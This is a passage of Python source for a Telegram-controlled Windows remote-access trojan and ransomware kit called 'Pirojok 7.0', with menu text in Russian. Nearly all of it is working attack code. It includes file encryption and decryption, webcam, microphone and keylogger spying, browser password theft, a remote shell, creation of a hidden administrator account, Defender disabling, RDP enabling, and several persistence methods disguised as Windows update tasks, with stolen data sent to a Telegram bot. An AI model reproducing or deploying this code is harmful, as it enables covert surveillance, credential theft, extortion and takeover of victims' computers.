            result = f"[OK] Encrypted {len(encrypted)} files\n"
            result += f"[NOTE] {note}\n"
            result += f"[KEY] {base64.b64encode(self.encryption_key).decode()}\n"
            result += f"[LOCK] Keys blocked!\n"
            result += f"[AUTO] Startup installed!"
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def decrypt_all(self, key_b64):
        """Decrypt all files"""
        try:
            self.encryption_key = base64.b64decode(key_b64)
            
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    os.remove(file)
                    decrypted += 1
                except: pass
            
            if decrypted > 0:
                self.unblock_keys()
                self.remove_cmd_message()
                self.p.remove_all_startup()
                self.active = False
                self.show_decrypted_message()
                return f"[OK] SYSTEM DECRYPTED! {decrypted} files recovered"
            else:
                return "[ERROR] No encrypted files found or invalid key"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def unblock_keys(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            except: pass
            self.p.send_message(self.p.owner_id, "[UNLOCK] Keys unlocked!")
        except: pass
    
    def remove_cmd_message(self):
        try:
            if self.cmd_window:
                self.cmd_window.terminate()
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*"')
        except: pass


class Pirojok:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "7.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        
        # Инициализация модулей
        self.ransom = PirojokRansomware(self)
        self.hider = ProcessHider(self)
        self.spy = SpyModule(self)
        self.files = FileManager(self)
        self.shell = RemoteShell(self)
        
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        self.admin_mode = self.check_admin()
        print(f"Admin rights: {'YES' if self.admin_mode else 'NO'}")
        
        self.hider.auto_masquerade()
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except: return False
    
    def request_admin(self):
        try:
            if self.check_admin():
                self.admin_mode = True
                return "[ADMIN] Already have admin rights!"
            if platform.system() != "Windows":
                return "[ERROR] Admin request only for Windows"
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            self.send_message(self.owner_id, "[ADMIN] Requesting admin rights...")
            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
            if result > 32:
                self.send_message(self.owner_id, "[ADMIN] Restarting with admin rights...")
                time.sleep(2)
                sys.exit(0)
            else:
                self.send_message(self.owner_id, f"[ERROR] Failed to get admin rights (code: {result})")
                return "[ERROR] Failed to get admin rights"
        except Exception as e:
            self.send_message(self.owner_id, f"[ERROR] {e}")
            return f"[ERROR] {e}"
    
    # ========== КОМАНДЫ ДЛЯ МОДУЛЕЙ ==========
    
    def cmd_webcam(self):
        """Сделать фото с веб-камеры"""
        result = self.spy.capture_webcam()
        if isinstance(result, bytes):
            self.send_photo(self.owner_id, result, "[WEBCAM] Photo")
            return "[WEBCAM] Photo sent"
        else:
            return result
    
    def cmd_mic(self, seconds=5):
        """Записать микрофон"""
        result = self.spy.record_microphone(seconds)
        if isinstance(result, bytes):
            self.send_audio(self.owner_id, result, f"[MIC] {seconds}s recording")
            return f"[MIC] Recording sent ({seconds}s)"
        else:
            return result
    
    def cmd_location(self):
        """Определить местоположение"""
        return self.spy.get_location()
    
    def cmd_passwords(self):
        """Украсть пароли"""
        result = self.spy.steal_passwords()
        self.send_message(self.owner_id, result)
        return "[PASSWORDS] Check temp folder for databases"
    
    def cmd_clipboard(self):
        """Получить буфер обмена"""
        return self.spy.get_clipboard()
    
    def cmd_keylog_start(self):
        """Запустить кейлоггер"""
        return self.spy.start_keylogger()
    
    def cmd_keylog_stop(self):
        """Остановить кейлоггер"""
        return self.spy.stop_keylogger()
    
    def cmd_keylog_get(self):
        """Получить лог нажатий"""
        return self.spy.get_keylog()
    
    def cmd_keylog_clear(self):
        """Очистить лог"""
        return self.spy.clear_keylog()
    
    def cmd_upload(self, filepath):
        """Отправить файл с духовки"""
        return self.files.upload_file(filepath)
    
    def cmd_download(self, url, filename=None):
        """Скачать файл на духовку"""
        return self.files.download_file(url, filename)
    
    def cmd_list_downloads(self):
        """Список скачанных файлов"""
        return self.files.list_downloads()
    
    def cmd_shell(self, command):
        """Удаленная консоль"""
        return self.shell.execute(command)
    
    def cmd_shell_history(self):
        """История команд"""
        return self.shell.get_history()
    
    def run_as_admin_command(self, command):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights. Use 'admin' first"
            if platform.system() == "Windows":
                process = subprocess.Popen(f'cmd /c {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    text=True, encoding='cp866', errors='ignore')
            else:
                process = subprocess.Popen(f'sudo {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
            self.processes.append(process)
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"[TIMEOUT]\nPartial output:\n{stdout}"
            result = ""
            if stdout: result += f"[OK]\n{stdout}\n"
            if stderr: result += f"[ERROR]\n{stderr}\n"
            return result or "[OK] Command executed"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def create_admin_user(self, username, password):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"[USER] Created user {username}\n{result}"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def enable_rdp(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"[RDP] Enabled\nIP: {ip}\nPort: 3389"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def disable_defender(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            return "[DEFENDER] Windows Defender disabled"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"[FW] Rule added for port {port}"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def ransomware_start(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights for ransomware"
            result = self.ransom.start_ransomware()
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def ransomware_key(self):
        try:
            if self.ransom.encryption_key:
                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
                return f"[KEY] {key_b64}"
            else:
                return "[ERROR] No key generated (run ransomware first)"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def ransomware_decrypt(self, key_b64):
        try:
            result = self.ransom.decrypt_all(key_b64)
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def add_all_startup_methods(self):
        results = []
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Registry HKCU
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("[OK] Registry HKCU")
        except: results.append("[FAIL] Registry HKCU")
        
        # Startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            vbs_script = f'''
            Set oWS = WScript.CreateObject("WScript.Shell")
            sLinkFile = "{startup_folder}\\WindowsUpdate.lnk"
            Set oLink = oWS.CreateShortcut(sLinkFile)
            oLink.TargetPath = "{exe_path}"
            oLink.Save
            '''
            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
            os.remove(vbs_path)
            results.append("[OK] Startup folder")
        except: results.append("[FAIL] Startup folder")
        
        # Task scheduler (logon)
        try:
            task_name = "WindowsUpdateTask"
            cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                   '/sc', 'onlogon', '/rl', 'highest', '/f']
            subprocess.run(cmd, capture_output=True)
            results.append("[OK] Task scheduler (logon)")
        except: results.append("[FAIL] Task scheduler (logon)")
        
        if self.admin_mode:
            # Task scheduler (system startup)
            try:
                task_name = "WindowsUpdateSystem"
                cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                       '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
                subprocess.run(cmd, capture_output=True)
                results.append("[OK] Task scheduler (startup)")
            except: results.append("[FAIL] Task scheduler (startup)")
            
            # Winlogon Shell
            try:
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    try:
                        current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                    except:
                        current_shell = "explorer.exe"
                    if exe_path not in current_shell:
                        new_shell = f"{exe_path}, {current_shell}"
                        winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
                results.append("[OK] Winlogon Shell")
            except: results.append("[FAIL] Winlogon Shell")
            
            # Active Setup
            try:
                guid = str(uuid.uuid4())
                key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.CreateKey(key, key_path) as regkey:
                    winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
                    winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
                results.append("[OK] Active Setup")
            except: results.append("[FAIL] Active Setup")
        
        return "\n".join(results)
    
    def remove_all_startup(self):
        """Remove from all startup locations"""
        results = []
        
        # Remove from registry HKCU
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "WindowsUpdateSvc")
            results.append("[OK] Removed from registry")
        except:
            results.append("[INFO] Not found in registry")
        
        # Remove from task scheduler
        try:
            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], 
                          capture_output=True)
            results.append("[OK] Removed WindowsUpdateTask")
        except:
            pass
        
        try:
            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], 
                          capture_output=True)
            results.append("[OK] Removed WindowsUpdateSystem")
        except:
            pass
        
        # Remove from Winlogon Shell if admin
        if self.admin_mode:
            try:
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                    if getattr(sys, 'frozen', False):
                        exe_path = sys.executable
                    else:
                        exe_path = os.path.abspath(__file__)
                    new_shell = current_shell.replace(f"{exe_path}, ", "").replace(f", {exe_path}", "")
                    winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
                results.append("[OK] Removed from Winlogon Shell")
            except:
                results.append("[INFO] Not found in Winlogon Shell")
        
        return "\n".join(results)
    
    def check_startup(self):
        """Check all startup locations for Pirojok entries"""
        results = []
        results.append("[STARTUP] Checking all locations:")
        
        # Check registry HKCU
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as regkey:
                try:
                    value, _ = winreg.QueryValueEx(regkey, "WindowsUpdateSvc")
                    results.append(f"[OK] Found in registry: {value}")
                except:
                    results.append("[INFO] Not found in registry")
        except:
            results.append("[INFO] Could not check registry")
        
        # Check startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            if os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.lnk')):
                results.append("[OK] Found in startup folder")
            else:
                results.append("[INFO] Not found in startup folder")
        except:
            results.append("[INFO] Could not check startup folder")
        
        # Check task scheduler
        try:
            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateTask'], 
                                   capture_output=True, text=True)
            if result.returncode == 0:
                results.append("[OK] Found in task scheduler (logon)")
            else:
                results.append("[INFO] Not found in task scheduler (logon)")
        except:
            results.append("[INFO] Could not check task scheduler (logon)")
        
        try:
            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateSystem'], 
                                   capture_output=True, text=True)
            if result.returncode == 0:
                results.append("[OK] Found in task scheduler (system)")
            else:
                results.append("[INFO] Not found in task scheduler (system)")
        except:
            results.append("[INFO] Could not check task scheduler (system)")
        
        # Check Winlogon Shell (admin only)
        if self.admin_mode:
            try:
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ) as regkey:
                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                    if getattr(sys, 'frozen', False):
                        exe_path = sys.executable
                    else:
                        exe_path = os.path.abspath(__file__)
                    if exe_path in current_shell:
                        results.append("[OK] Found in Winlogon Shell")
                    else:
                        results.append("[INFO] Not found in Winlogon Shell")
            except:
                results.append("[INFO] Could not check Winlogon Shell")
        
        # Check Active Setup (admin only)
        if self.admin_mode:
            try:
                key = winreg.HKEY_LOCAL_MACHINE
                subkey = r"SOFTWARE\Microsoft\Active Setup\Installed Components"
                found = False
                i = 0
                while True:
                    try:
                        guid = winreg.EnumKey(key, subkey, i)
                        guid_key = os.path.join(subkey, guid)
                        with winreg.OpenKey(key, guid_key, 0, winreg.KEY_READ) as gkey:
                            stub, _ = winreg.QueryValueEx(gkey, "StubPath")
                            if getattr(sys, 'frozen', False) and sys.executable in stub:
                                found = True
                                break
                        i += 1
                    except WindowsError:
                        break
                if found:
                    results.append("[OK] Found in Active Setup")
                else:
                    results.append("[INFO] Not found in Active Setup")
            except:
                results.append("[INFO] Could not check Active Setup")
        
        # Check watchdog
        results.append(self.hider.check_watchdog())
        
        return "\n".join(results)
    
    def check_and_restore(self):
        """Check if everything is working after reboot"""
        try:
            issues = []
            
            if self.admin_mode:
                startup_check = self.check_startup()
                if "Found" not in startup_check:
                    self.add_all_startup_methods()
                    issues.append("Startup restored")
            
            test_shot = self.take_screenshot()
            if not test_shot:
                issues.append("Screenshot may not work")
            
            if issues:
                self.send_message(self.owner_id, f"[RESTORE] Fixed: {', '.join(issues)}")
        except:
            pass
    
    def send_message(self, chat_id, text):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_text = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": chat_id, "text": simple_text}
            
            requests.post(url, data=data, timeout=10)
            print(f"Sent: {text[:30]}...")
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": simple_caption}
            
            requests.post(url, files=files, data=data, timeout=30)
            print(f"Photo sent: {caption[:30]}...")
        except Exception as e:
            print(f"Photo error: {e}")
    
    def send_audio(self, chat_id, audio_bytes, caption=""):
        """Отправить аудиофайл"""
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendAudio"
            files = {"audio": ("recording.wav", audio_bytes, "audio/wav")}
            data = {"chat_id": chat_id, "caption": simple_caption}
            
            requests.post(url, files=files, data=data, timeout=60)
            print(f"Audio sent: {caption[:30]}...")
        except Exception as e:
            print(f"Audio error: {e}")
    
    def send_file(self, chat_id, file_bytes, filename, caption=""):
        """Отправить файл"""
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendDocument"
            files = {"document": (filename, file_bytes)}
            data = {"chat_id": chat_id, "caption": simple_caption}
            
            requests.post(url, files=files, data=data, timeout=60)
            print(f"File sent: {filename}")
        except Exception as e:
            print(f"File error: {e}")
    
    def get_system_info(self):
        info = []
        info.append(f"[PIROJOK] System Info")
        info.append(f"Version: {self.version}")
        info.append(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"Host: {socket.gethostname()}")
        info.append(f"User: {getpass.getuser()}")
        info.append(f"Admin: {'YES' if self.admin_mode else 'NO'}")
        info.append(f"Mask: {'YES' if self.hider.masked else 'NO'}")
        try:
            info.append(f"IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"IP: unknown")
        info.append(f"OS: {platform.system()} {platform.release()}")
        uptime = datetime.now() - self.startup_time
        info.append(f"Uptime: {str(uptime).split('.')[0]}")
        return "\n".join(info)
    
    def take_screenshot(self):
        """Take screenshot with multiple fallback methods"""
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            try:
                screenshot = ImageGrab.grab()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='JPEG', quality=85)
                img_bytes.seek(0)
                return img_bytes.read()
            except:
                return None
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            if self.started: return
            self.started = True
            
            threading.Timer(10.0, self.check_and_restore).start()
            
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"[PIROJOK] Started!\n"
            message += f"Boot time: {boot_time}\n"
            message += f"Host: {socket.gethostname()}\n"
            message += f"User: {getpass.getuser()}\n"
            message += f"Admin: {'YES' if self.admin_mode else 'NO'}\n"
            message += f"Mask: {'YES' if self.hider.masked else 'NO'}"
            self.send_message(self.owner_id, message)
            
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
        except Exception as e:
            print(f"Startup error: {e}")
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "[ERROR] Not for you!")
            return
        print(f"Command: {text}")
        if self.processing:
            print("Already processing, skipping...")
            return
        self.processing = True
        try:
            current_admin = self.check_admin()
            if current_admin != self.admin_mode:
                self.admin_mode = current_admin
                print(f"Admin rights changed: {'YES' if self.admin_mode else 'NO'}")
            
            # Commands that need admin rights
            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                             "add_rule", "task_startup", "explorer_shell", "active_setup", 
                             "inject", "watchdog", "ransom", "ransom_start"]
            
            cmd_type = text.split()[0] if text else ""
            
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "[ADMIN] This command needs admin rights. Use 'admin' first")
                self.processing = False
                return
            
            # === HELP / MENU ===
            if text == "help" or text == "menu":
                help_text = """
🔥 PIROJOK 7.0 - ПОЛНЫЙ КОМПЛЕКС ШПИОНАЖА 🔥

[🎥] ВИДЕО/АУДИО:
• webcam - фото с веб-камеры
• mic [сек] - запись микрофона (по умолч. 5 сек)

[📍] ГЕОЛОКАЦИЯ:
• location - определить местоположение
• wifi - показать Wi-Fi сети

[🔑] КРАЖА ДАННЫХ:
• passwords - украсть пароли из браузеров
• clipboard - буфер обмена
• keylog_start - запустить кейлоггер
• keylog_stop - остановить кейлоггер
• keylog_get - получить лог нажатий
• keylog_clear - очистить лог

[📁] ФАЙЛЫ:
• upload <путь> - отправить файл с духовки
• download <url> [имя] - скачать файл на духовку
• downloads - список скачанных файлов

[💻] УДАЛЕННАЯ КОНСОЛЬ:
• shell <команда> - выполнить команду
• history - история команд

[🔒] RANSOMWARE:
• ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
• ransom_key - показать ключ
• ransom_decrypt <key> - расшифровать

[🥷] МАСКИРОВКА:
• mask_status - статус маскировки
• mask_remove - снять маскировку
• inject - внедриться в процесс
• watchdog - самовосстановление

[⚡] ПИТАНИЕ:
• shutdown_now - выключить сейчас
• reboot_now - перезагрузить сейчас
• shutdown - выкл через 5 сек
• reboot - перезагр через 5 сек
• abort - отмена

[👑] АДМИН:
• admin - запросить права
• admin_check - проверить права
• enable_rdp - включить RDP
• disable_defender - отключить Defender

[🔄] АВТОЗАПУСК:
• startup_reg - в реестр
• startup_folder - в папку
• task_logon - планировщик (вход)
• task_startup - планировщик (система)
• startup_remove_all - удалить всё
• startup_check - проверить автозагрузку

[📸] ОСНОВНОЕ:
• shot - скриншот
• info - информация
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            
            # === ШПИОНСКИЕ КОМАНДЫ ===
            if text == "webcam":
                result = self.cmd_webcam()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("mic"):
                parts = text.split()
                seconds = parts[1] if len(parts) > 1 else 5
                result = self.cmd_mic(seconds)
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "location":
                result = self.cmd_location()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "wifi":
                result = self.spy.get_location()  # Там уже есть Wi-Fi
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "passwords":
                result = self.cmd_passwords()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "clipboard":
                result = self.cmd_clipboard()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_start":
                result = self.cmd_keylog_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_stop":
                result = self.cmd_keylog_stop()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_get":
                result = self.cmd_keylog_get()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_clear":
                result = self.cmd_keylog_clear()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === ФАЙЛОВЫЕ КОМАНДЫ ===
            if text.startswith("upload"):
                parts = text.split(maxsplit=1)
                if len(parts) == 2:
                    result = self.cmd_upload(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: upload <filepath>")
                self.processing = False
                return
            
            if text.startswith("download"):
                parts = text.split()
                if len(parts) >= 2:
                    url = parts[1]
                    filename = parts[2] if len(parts) > 2 else None
                    result = self.cmd_download(url, filename)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: download <url> [filename]")
                self.processing = False
                return
            
            if text == "downloads":
                result = self.cmd_list_downloads()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === УДАЛЕННАЯ КОНСОЛЬ ===
            if text.startswith("shell"):
                cmd = text[5:].strip()
                if cmd:
                    result = self.cmd_shell(cmd)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: shell <command>")
                self.processing = False
                return
            
            if text == "history":
                result = self.cmd_shell_history()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === RANSOMWARE ===
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: ransom_decrypt <key>")
                self.processing = False
                return
            
            # === MASQUERADE ===
            if text == "mask_status":
                self.send_message(chat_id, self.hider.get_mask_status())
                self.processing = False
                return
            
            if text == "mask_remove":
                self.send_message(chat_id, "[MASK] Removing masquerade...")
                self.hider.remove_masks()
                self.processing = False
                return
            
            if text == "inject":
                result = self.hider.inject_into_system()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "watchdog":
                result = self.hider.setup_watchdog()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === BASIC ===
            if text == "shot":
                self.send_message(chat_id, "[CAM] Taking screenshot...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "[SCREEN] Screenshot")
                else:
                    self.send_message(chat_id, "[ERROR] Failed to take screenshot")
                self.processing = False
                return
            
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "[ADMIN] Already have admin rights!")
                else:
                    self.send_message(chat_id, "[ADMIN] Requesting rights...")
                    result = self.request_admin()
                    if result:
                        self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "admin_check":
                status = "YES" if self.admin_mode else "NO"
                self.send_message(chat_id, f"[ADMIN] Admin rights: {status}")
                self.processing = False
                return
            
            if text == "enable_rdp":
                result = self.enable_rdp()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "disable_defender":
                result = self.disable_defender()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === STARTUP ===
            if text == "startup_reg":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
                    self.send_message(chat_id, "[OK] Added to registry (HKCU\\Run)")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "startup_folder":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    startup_folder = os.path.join(os.getenv('APPDATA'),
                        r'Microsoft\Windows\Start Menu\Programs\Startup')
                    vbs_script = f'''
                    Set oWS = WScript.CreateObject("WScript.Shell")
                    sLinkFile = "{startup_folder}\\Pirojok.lnk"
                    Set oLink = oWS.CreateShortcut(sLinkFile)
                    oLink.TargetPath = "{exe_path}"
                    oLink.Save
                    '''
                    vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
                    with open(vbs_path, 'w') as f:
                        f.write(vbs_script)
                    subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
                    os.remove(vbs_path)
                    self.send_message(chat_id, "[OK] Added to startup folder")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "task_logon":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    task_name = "PirojokLogon"
                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                           '/sc', 'onlogon', '/rl', 'highest', '/f']
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.send_message(chat_id, "[OK] Added to task scheduler (logon)")
                    else:
                        self.send_message(chat_id, f"[ERROR] {result.stderr}")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
